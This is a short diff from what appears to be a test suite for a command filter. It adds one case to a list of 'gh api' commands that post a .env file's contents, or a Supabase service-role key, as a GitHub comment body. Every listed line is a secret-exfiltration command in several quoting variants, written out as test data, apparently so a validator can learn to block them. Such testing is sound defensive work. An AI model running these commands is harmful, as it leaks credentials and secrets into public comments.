@@ -3949,6 +3949,7 @@ try {
       `gh api ${replyEndpoint} --field body=@.env`,
       `gh api ${replyEndpoint} --input .env`,
       `gh api ${replyEndpoint} -f body="$(cat .env)"`,
+      `gh api ${replyEndpoint} -f body=%SUPABASE_SERVICE_ROLE_KEY%`,
       `gh api ${replyEndpoint} -f "body='$(cat .env)'"`,
       `gh api ${replyEndpoint} -f body="x'$(cat .env)'y"`,
       `gh api ${replyEndpoint} -f body=\\'$(<.env)\\'`,
